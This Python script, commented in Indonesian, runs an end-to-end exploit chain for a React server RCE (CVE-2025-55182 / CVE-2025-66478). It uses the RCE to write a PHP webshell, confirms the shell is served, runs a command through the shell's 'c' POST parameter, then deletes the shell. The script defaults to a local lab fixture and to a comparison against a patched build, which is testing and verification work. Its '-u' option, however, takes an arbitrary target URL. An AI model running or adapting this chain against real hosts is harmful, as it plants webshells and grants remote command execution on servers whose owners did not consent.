"""Rantai e2e 4 tahap: RCE React -> tulis webshell -> eksekusi perintah -> bersih-bersih.

Runner ini mengorkestrasi rantai eksploitasi penuh CVE-2025-55182 /
CVE-2025-66478 terhadap target lab (fixture `tests/e2e_support.py`):

  1. upload  : payload RCE menulis webshell PHP via fs.writeFileSync,
               lalu melempar NEXT_REDIRECT dengan penanda `UPLOADED:<nama>`.
  2. serve   : GET /poc_shell_<hex8>.php memastikan webshell tersaji.
  3. exec    : POST c=<perintah uji> memastikan keluaran perintah terpantul
               di dalam <POC_OUT>...</POC_OUT>.
  4. cleanup : payload RCE menghapus webshell via fs.unlinkSync, lalu GET
               ulang memastikan webshell sudah hilang (404).

Verdict `VULNERABLE` hanya jika keempat tahap lulus; skenario
sudah-dipatch (rce-fixed) memutus rantai di tahap pertama sehingga
hasilnya `NOT VULNERABLE`.

Contoh:
    python poc_chain.py                        # fixture lab rce-upload (default)
    python poc_chain.py --fixed                # pembanding versi sudah-dipatch
    python poc_chain.py -u http://127.0.0.1:8080 --insecure
    python poc_chain.py --json hasil_chain.json

Exit code `0` bila verdict sesuai ekspektasi mode terpilih
(VULNERABLE untuk run biasa, NOT VULNERABLE untuk --fixed).
"""

from __future__ import annotations

import argparse
import json
import secrets
import sys
from pathlib import Path
from typing import Dict, List, Optional

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tests"))

import requests

import scanner
from e2e_support import FixtureTarget, Scenario

CHAIN_CVES = "CVE-2025-55182 / CVE-2025-66478"
CHAIN_RCE_COMMAND = "echo POC_CHAIN_EXEC_OK_7f3a"
CHAIN_EXEC_OPEN = "<POC_OUT>"
CHAIN_EXEC_CLOSE = "</POC_OUT>"
CHAIN_SERVE_HINT = "<!-- webshell tersaji -->"


def new_shell_name() -> str:
    """Nama webshell acak sesuai pola scanner.CHAIN_SHELL_NAME_RE."""
    return f"poc_shell_{secrets.token_hex(4)}.php"


def _shell_url(target_url: str, shell_name: str) -> str:
    return target_url.rstrip("/") + "/" + shell_name


def _plain_get(
    url: str,
    timeout: int,
    verify_ssl: bool,
) -> requests.Response:
    return requests.get(
        url,
        timeout=timeout,
        verify=verify_ssl,
        proxies=scanner.request_proxies(),
    )


def _plain_post(
    url: str,
    data: Dict[str, str],
    timeout: int,
    verify_ssl: bool,
) -> requests.Response:
    return requests.post(
        url,
        data=data,
        timeout=timeout,
        verify=verify_ssl,
        proxies=scanner.request_proxies(),
    )


def run_chain(
    target_url: str,
    timeout: int = 5,
    verify_ssl: bool = True,
) -> Dict:
    """Jalankan rantai 4 tahap terhadap target_url.

    Bentuk hasil kompatibel dengan poc_lab.Case: kunci `verdict` dan
    `findings` mengikuti kontrak scan_host, sehingga lab cukup memanggil
    runner ini lewat Case.runner.
    """
    shell_name = new_shell_name()
    shell_url = _shell_url(target_url, shell_name)
    stages: List[Dict] = []

    # Tahap 1: upload - RCE menulis webshell --------------------------------
    body, content_type = scanner.react_build_upload_payload(shell_name)
    response, error = scanner.react_send_payload(
        target_url,
        scanner.react_chain_headers(content_type),
        body,
        timeout,
        verify_ssl,
    )
    uploaded = False
    if response is None:
        upload_detail = f"RCE gagal dikirim ({error or 'tanpa respons'})"
    else:
        uploaded = scanner.react_is_vulnerable_rce_token(
            response, scanner.CHAIN_UPLOAD_MARKER
        )
        if uploaded:
            upload_detail = (
                f"webshell {shell_name} tertulis via RCE "
                f"({response.headers.get('X-Action-Redirect', '')})"
            )
        else:
            upload_detail = (
                "tanda UPLOADED tidak muncul "
                f"(HTTP {response.status_code}, error={error or '-'})"
            )
    stages.append({"name": "upload", "ok": uploaded, "detail": upload_detail})

    # Tahap 2: serve - webshell tersaji -------------------------------------
    served = False
    serve_detail = ""
    try:
        resp = _plain_get(shell_url, timeout, verify_ssl)
        served = resp.status_code == 200 and CHAIN_SERVE_HINT in resp.text
        if served:
            serve_detail = f"GET {shell_name} -> 200, webshell tersaji"
        else:
            serve_detail = f"GET {shell_name} -> HTTP {resp.status_code}"
    except requests.RequestException as exc:
        serve_detail = f"GET {shell_name} gagal: {exc}"
    stages.append({"name": "serve", "ok": served, "detail": serve_detail})

    # Tahap 3: exec - perintah uji dieksekusi webshell ----------------------
    executed = False
    exec_detail = ""
    try:
        resp = _plain_post(
            shell_url, {"c": CHAIN_RCE_COMMAND}, timeout, verify_ssl
        )
        expected_out = f"{CHAIN_EXEC_OPEN}{CHAIN_RCE_COMMAND}{CHAIN_EXEC_CLOSE}"
        executed = resp.status_code == 200 and expected_out in resp.text
        if executed:
            exec_detail = (
                f"POST c=... -> keluaran perintah terpantul ({expected_out})"
            )
        else:
            exec_detail = (
                f"POST c=... -> HTTP {resp.status_code} tanpa "
                f"{CHAIN_EXEC_OPEN}...{CHAIN_EXEC_CLOSE}"
            )
    except requests.RequestException as exc:
        exec_detail = f"POST c=... gagal: {exc}"
    stages.append({"name": "exec", "ok": executed, "detail": exec_detail})

    # Tahap 4: cleanup - RCE menghapus webshell, GET ulang wajib 404 --------
    body, content_type = scanner.react_build_delete_payload(shell_name)
    response, error = scanner.react_send_payload(
        target_url,
        scanner.react_chain_headers(content_type),
        body,
        timeout,
        verify_ssl,
    )
    cleanup_requested = (
        response is not None
        and scanner.react_is_vulnerable_rce_token(
            response, scanner.CHAIN_CLEANUP_TOKEN
        )
    )
    gone = False
    gone_detail = ""
    try:
        resp = _plain_get(shell_url, timeout, verify_ssl)
        gone = resp.status_code == 404
        gone_detail = f"GET ulang {shell_name} -> HTTP {resp.status_code}"
    except requests.RequestException as exc:
        gone_detail = f"GET ulang gagal: {exc}"
    cleaned = cleanup_requested and gone
    if response is not None and cleanup_requested:
        cleanup_detail = (
            f"RCE unlinkSync diproses "
            f"({response.headers.get('X-Action-Redirect', '')}); "
            + gone_detail
        )
    else:
        http_status = response.status_code if response is not None else "-"
        cleanup_detail = (
            f"permintaan cleanup tidak diterima "
            f"(HTTP {http_status}, error={error or '-'}); "
            + gone_detail
        )
    stages.append({"name": "cleanup", "ok": cleaned, "detail": cleanup_detail})

    all_ok = all(stage["ok"] for stage in stages)
    verdict = "VULNERABLE" if all_ok else "NOT VULNERABLE"
    broken = ", ".join(
        stage["name"] for stage in stages if not stage["ok"]
    )
    reason = (
        "Rantai RCE -> webshell tuntas: tulis, sajikan, eksekusi perintah, "
        "dan bersih-bersih."
        if all_ok
        else f"Rantai terputus pada tahap: {broken}."
    )
    finding = {
        "engine": "chain",
        "cve": CHAIN_CVES,
        "host": target_url,
        "shell": shell_name,
        "vulnerable": all_ok,
        "verdict": verdict,
        "reason": reason,
        "stages": stages,
    }
    return {"verdict": verdict, "findings": [finding]}


def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Rantai e2e 4 tahap: RCE React -> webshell "
            "(upload -> serve -> exec -> cleanup)."
        )
    )
    parser.add_argument(
        "-u",
        "--url",
        default=None,
        help="URL target; kosongkan untuk memakai fixture lab lokal",
    )
    parser.add_argument(
        "--fixed",
        action="store_true",
        help="Jalankan pada fixture versi sudah-dipatch (rce-fixed)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=5,
        help="Timeout tiap permintaan dalam detik (default: 5)",
    )
    parser.add_argument(
        "--insecure",
        action="store_true",
        help="Nonaktifkan verifikasi TLS (khusus lab/internal)",
    )
    parser.add_argument(
        "--json",
        dest="json_path",
        default=None,
        help="Simpan hasil mentah (JSON) ke berkas ini",
    )
    args = parser.parse_args()

    # Lab berjalan penuh offline terhadap fixture lokal.
    scanner.RUNTIME.rate_limit = 0
    scanner.RUNTIME.retries = 0
    scanner.RUNTIME.retry_backoff = 0
    scanner.RUNTIME.proxy = None

    verify_ssl: bool = not args.insecure
    expected = "NOT VULNERABLE" if args.fixed else "VULNERABLE"

    if args.url:
        result = run_chain(
            args.url, timeout=args.timeout, verify_ssl=verify_ssl
        )
    else:
        scenario = Scenario(
            react="rce-fixed" if args.fixed else "rce-upload"
        )
        with FixtureTarget(scenario) as target:
            result = run_chain(
                target.url, timeout=args.timeout, verify_ssl=verify_ssl
            )

    finding = result["findings"][0]
    print()
    print(f"=== RANTAI RCE -> WEBSHELL | {finding['cve']} ===")
    print(f"    Rantai RCE React menulis webshell PHP lalu membersihkannya.")
    print(f"    target : {finding['host']}")
    print(f"    shell  : {finding['shell']}")
    for stage in finding["stages"]:
        mark = "OK" if stage["ok"] else "GAGAL"
        print(f"    {stage['name']:<8}: {mark} - {stage['detail']}")
    print(f"    verdict: {result['verdict']}")
    print(f"    alasan : {finding['reason']}")
    print()
    ok = result["verdict"] == expected
    if ok:
        print(f"HASIL RANTAI: sesuai ekspektasi ({expected}).")
    else:
        print(
            f"HASIL RANTAI: TIDAK SESUAI ekspektasi "
            f"(dapat {result['verdict']}, harusnya {expected})."
        )

    if args.json_path:
        Path(args.json_path).write_text(
            json.dumps(result, indent=2, ensure_ascii=False),
            encoding="utf-8",
        )
        print(f"Hasil mentah tersimpan: {args.json_path}")

    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
